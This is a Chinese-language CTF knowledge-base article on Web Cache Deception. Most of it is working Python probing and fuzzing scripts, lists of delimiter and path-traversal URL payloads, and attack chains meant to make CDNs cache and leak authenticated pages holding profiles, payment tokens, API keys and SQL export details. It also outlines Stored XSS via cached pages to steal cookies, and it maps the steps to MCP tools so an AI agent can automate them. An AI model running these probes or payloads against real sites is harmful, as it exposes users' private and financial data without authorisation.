---
id: "ctf-website/08-infra/web-cache-deception"
title: "Web Cache Deception"
title_en: "Web Cache Deception"
summary: >
  Web缓存欺骗攻击完整指南，利用CDN将动态页面以静态扩展名（.css/.js/.json）缓存，泄露认证后的敏感数据。涵盖基础Payload、分隔符变体绕过路径规范化（Spring ;分号、NUL字节截断）、Stored XSS via Cache Deception，以及与Cache Poisoning的核心区别对比。
summary_en: >
  Complete guide to Web Cache Deception attacks, exploiting CDN caching of dynamic pages with static extensions (.css/.js/.json) to leak authenticated sensitive data. Covers basic payloads, delimiter variants to bypass path normalization (Spring semicolon, NUL byte truncation), Stored XSS via Cache Deception, and key differences from Cache Poisoning.
board: "ctf-website"
category: "08-infra"
signals: ["web cache deception", "缓存欺骗", "CDN", "静态文件缓存", "path delimiter", "X-Cache"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["Web Cache Deception", "CDN缓存欺骗", "缓存投毒区别", "动态页面缓存", "路径分隔符绕过", "敏感数据泄露", "cache deception vs poisoning"]
difficulty: "advanced"
tags: ["caching", "cdn", "cache-deception", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/08-infra/race-cache-smuggling", "ctf-website/02-auth/host-header", "ctf-website/14-idor/01-idor-enumeration", "ctf-website/12-payment/payment-email-bounce-idor", "ctf-website/24-database/05-backup-log-leak"]
---
# Web Cache Deception

## 原理

CDN/缓存把 URL 以 `.css`、`.js` 结尾的响应当作静态资源缓存。攻击者在敏感 URL 后附加静态扩展名，诱导缓存把动态页面当作静态文件存下来 → 其他用户访问同一 URL → 拿到缓存的敏感数据。

```
GET /account/settings.css  → CDN 认为这是 CSS → 缓存
                            → 实际后端是 /account/settings → 动态页面
                            → 缓存中存了用户的个人信息
```

### 0.1 动态资源到账户/订单/配置 Oracle

Cache Deception 的核心不是扩展名 payload 多，而是找“后端仍按动态资源出内容、CDN 却按静态资源存副本”的路由。支付、订单、导出和配置页面优先，因为这些页面往往带用户态、金额、签名、下载 token 或 SQL 导出的文件名。

| 动态路由 | 静态变体 | A 账号预热 marker | B/匿名复取信号 | 下一跳 |
|---|---|---|---|---|
| `/account`, `/me`, `/profile` | `.css`, `.json`, `;.css` | username、email、csrf | 复取到 A 的身份字段 | IDOR、CSWSH、session oracle |
| `/orders/<id>`, `/invoice/<id>` | `.pdf`, `.json`, `.js` | orderId、amount、address | B 读到订单/发票 | payment-email-bounce-idor |
| `/wallet`, `/payments`, `/checkout` | `.json`, `.txt`, `.ico` | balance、payToken、callback URL | 支付 token 或状态外泄 | payment logic、race lost update |
| `/admin/config`, `/debug/env` | `.js`, `.map`, `.json` | API endpoint、bucket、dsn | 配置被共享缓存 | backup/log leak、SSRF |
| `/export`, `/report`, `/download` | `.csv`, `.xlsx`, `.zip` | SQL 导出列名、文件名 | 下载 token 可复用 | SQLi/backup/log leak |

```python
# cache_deception_route_matrix.py
import csv
import hashlib
import re
import requests

EXTS = [".css", ".js", ".json", ".ico", ".txt", ".pdf", ".csv"]
DELIMS = ["", ";", "%3b", "/x", "%2fx", "..;", "/..;/"]
MARKERS = [r"user(name)?", r"email", r"csrf", r"order", r"amount", r"balance", r"invoice", r"token", r"select|insert|update|sql"]

def sig(text):
    return hashlib.sha256(text[:8192].encode(errors="ignore")).hexdigest()[:16]

def variants(path):
    path = path.rstrip("/")
    for ext in EXTS:
        yield path + ext
        for delim in DELIMS[1:]:
            yield path + delim + ext

def hit_markers(text):
    joined = "|".join(MARKERS)
    return ",".join(sorted(set(m.group(0).lower() for m in re.finditer(joined, text, re.I))))

def probe(base, paths, cookie_a, out_csv="exports/cache_deception_route_matrix.csv"):
    rows = []
    s = requests.Session()
    for path in paths:
        for suffix in variants(path):
            url = base.rstrip("/") + suffix
            warm = s.get(url, headers={"Cookie": cookie_a}, timeout=10)
            replay = s.get(url, timeout=10)
            rows.append({
                "url": url,
                "warm_status": warm.status_code,
                "replay_status": replay.status_code,
                "warm_sig": sig(warm.text),
                "replay_sig": sig(replay.text),
                "same_body": sig(warm.text) == sig(replay.text),
                "cache": replay.headers.get("X-Cache") or replay.headers.get("CF-Cache-Status") or "",
                "age": replay.headers.get("Age", ""),
                "content_type": replay.headers.get("Content-Type", ""),
                "markers": hit_markers(replay.text),
            })
    with open(out_csv, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0]))
        w.writeheader()
        w.writerows(rows)

probe("https://target", ["/account", "/orders/1001", "/wallet", "/payments", "/admin/config", "/export"], "session=ACCOUNT_A")
```

同时保存 `exports/deception_identity_diff.jsonl`：每条写入 A/B 身份、URL、cache header、body hash、命中的订单号/金额/token/SQL 列名。只看 `X-Cache: HIT` 不够，关键是 B/匿名复取是否拿到 A 预热留下的业务 marker。

## 基础 Payload

### 缓存判定矩阵

Web Cache Deception 的关键是“后端按动态路由处理，缓存按静态资源处理”。判断时至少跑两组账号：A 带 cookie 预热，B 无 cookie 或低权限复取。

| 维度 | 观察点 | 可利用信号 | 失败样本 |
|---|---|---|---|
| 扩展名 | `.css` / `.js` / `.json` / `.ico` | `X-Cache: HIT` 且正文仍是账号页 | `Content-Type` 正确但 `Cache-Control: private` |
| Cookie | A 预热、B 复取 | B 读到 A 的用户名、订单、csrf | B 拿到登录页或 403 |
| Path parser | `;`、`%3b`、`%2f`、`.` | 后端命中 `/account`，CDN 命中 `.css` | 后端 404 或 CDN bypass |
| Query key | `?v=1`、`?cb=...` | query 不入 key 或 key 可预测 | 每个 query 都 miss |
| Header key | `Accept`、`Accept-Encoding`、`Authorization` | 认证响应进入共享缓存 | `Vary: Cookie, Authorization` |
| 状态码 | 200/302/404 | 200 动态页被缓存，或 302 泄露 Location | 只缓存静态 404 |

```python
# cache_deception_oracle.py — 双身份缓存欺骗判定
import hashlib
import requests

def body_sig(text):
    return hashlib.sha256(text[:4096].encode(errors="ignore")).hexdigest()[:12]

def probe_cache_deception(base, path, cookie_a=None):
    url = base.rstrip("/") + path
    s = requests.Session()
    headers_a = {"Cookie": cookie_a} if cookie_a else {}
    warm = s.get(url, headers=headers_a, timeout=10)
    replay = s.get(url, timeout=10)
    cache_headers = {
        k: replay.headers.get(k)
        for k in ["X-Cache", "CF-Cache-Status", "Age", "Cache-Control", "Vary", "Content-Type"]
        if replay.headers.get(k)
    }
    return {
        "url": url,
        "warm_status": warm.status_code,
        "replay_status": replay.status_code,
        "warm_len": len(warm.text),
        "replay_len": len(replay.text),
        "warm_sig": body_sig(warm.text),
        "replay_sig": body_sig(replay.text),
        "cache_headers": cache_headers,
        "same_body": body_sig(warm.text) == body_sig(replay.text),
    }
```

```python
# 缓存欺骗 fuzz 脚本
import requests

DECEPTION_PAYLOADS = [
    # 基础静态扩展
    "/account/settings.css",
    "/account/settings.js",
    "/account/settings.json",
    "/account/settings.png",
    "/account/settings.jpg",
    "/account/settings.html",
    "/account/settings.ico",
    "/account/settings.xml",
    "/account/settings.txt",
    "/account/settings.pdf",

    # 分隔符变体 (绕过路径规范化)
    "/account/settings;.css",       # Spring: ; 是路径参数 → /account/settings 处理
    "/account/settings%3b.css",     # 编码分号
    "/account/settings%00.css",     # NUL byte → OpenLiteSpeed 截断为 /account/settings
    "/account/settings..;.css",     # 某些路径规范化变体

    # 路径穿越变体
    "/account%2f..%2fstatic%2f..%2fsettings.css",
    "/account/..;/static/..;/settings.css",

    # 查询参数
    "/account/settings?fake=css",
    "/account/settings.css?v=1",

    # 大小写
    "/account/settings.CSS",
    "/account/settings.JsOn",
]

def detect_deception(target: str, session_cookie: str = ""):
    """测试缓存欺骗漏洞"""
    for payload in DECEPTION_PAYLOADS:
        headers = {}
        if session_cookie:
            headers["Cookie"] = session_cookie

        r = requests.get(f"https://{target}{payload}", headers=headers)

        # 检查是否被缓存
        cache_hit = r.headers.get("X-Cache", "").lower()
        cf_cache = r.headers.get("Cf-Cache-Status", "").lower()

        if "hit" in cache_hit or "hit" in cf_cache:
            print(f"[!] CACHED: {payload}")
            # 用无 cookie 的请求验证 → 看是否能读到认证后的数据
            r2 = requests.get(f"https://{target}{payload}")
            if len(r2.text) > 500 and "account" in r2.text.lower():
                print(f"    [!] DECEPTION CONFIRMED: unauthenticated gets auth data")
```

## Web Cache Deception + Delimiter

```python
# 利用不同服务器对分隔符的理解差异

# Spring Boot: ; 是 matrix variable
# GET /account;.css → 路由到 /account → 返回敏感数据
# CDN 看到 .css → 缓存
DELIMITER_PAYLOADS = {
    "spring": "/private;.css",
    "rails": "/private.json",  # Rails 用 .format
    "play": "/private.css",
    "express": "/private%2f..%2fstatic%2f..%2fprivate.css",
    "iis": "/private.aspx.css",
    "tomcat": "/private;.css",
    "nginx": "/private%00.css",   # NUL 截断?
}
```

### Path Delimiter 变体生成

```python
# cache_deception_variants.py
EXTS = [".css", ".js", ".json", ".ico", ".png", ".txt", ".xml"]
DELIMS = ["", ";", "%3b", "%2f", "%252f", "%00", "..;", "/..;/", "/.;/"]

def deception_variants(dynamic_path):
    dynamic_path = dynamic_path.rstrip("/")
    out = []
    for ext in EXTS:
        out.append(dynamic_path + ext)
        for delim in DELIMS:
            if delim:
                out.append(dynamic_path + delim + ext)
        out.append(dynamic_path + "/x" + ext)
        out.append(dynamic_path + "%2fx" + ext)
        out.append(dynamic_path + ";x=1" + ext)
    return list(dict.fromkeys(out))
```

## Stored XSS via Cache Deception

```python
# 1. 在你的账户中存 XSS payload (如个人简介)
# 2. 访问 /profile/attacker.json → CDN 缓存 (含 XSS)
# 3. 诱导他人访问 /profile/attacker.json → CDN serve 含 XSS 的缓存
# 4. XSS 在 target.com origin 下执行 → 读取他人 cookie
```

## 与 Cache Poisoning 的区别

```
Cache Deception: URL 欺骗 → 缓存动态页面 → 泄露数据
Cache Poisoning:  注入 unkeyed header → 缓存恶意响应 → XSS/redirect
```

## 攻击链

```
Cache Deception → /account.css → 缓存别人 profile → PII 泄露
Cache Deception → /admin/config.js → 缓存管理配置 → API key 泄露
Cache Deception → XSS payload 缓存 → Stored XSS on CDN → 全站攻击
Cache Deception + delimiter → ;.css bypass → 绕过 URL 规范化 → 更多页面可缓存
Cache Deception + crawl → 搜索爬虫 → CDN 预热恶意缓存 → 被动攻击
Cache Deception → /orders/1001.json → 订单/发票复取 → 支付回调参数拼接
Cache Deception → /export.csv → SQL 导出列名/where 条件泄露 → SQLi 字段字典
```

## Evidence

- `deception_probes.json`: payload、A 账号预热响应、B/匿名复取响应、状态码、长度、hash。
- `cache_headers.json`: `X-Cache`、`CF-Cache-Status`、`Age`、`Cache-Control`、`Vary`、`Content-Type`。
- `cache_deception_route_matrix.csv`: 动态路由、静态变体、A/B hash、cache 命中、订单/支付/SQL marker。
- `deception_identity_diff.jsonl`: A 身份预热与 B/匿名复取的字段差异，保留 orderId、amount、balance、token、列名。
- `parser_matrix.csv`: delimiter、后端路由命中、CDN key、缓存命中、是否跨身份复取。
- 成功样本: A 预热 `/account;.css` 后，B 无 cookie 读到 A 的账号字段或 flag。
- 失败样本: B 只拿登录页、`Vary: Cookie` 生效、所有动态响应 `Cache-Control: private/no-store`。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| Web 缓存欺骗探测 | `http_probe` | HTTP GET 探测缓存机制和欺骗入口 |
| 知识检索 | `kb_router` | 按缓存欺骗信号搜索知识库 |
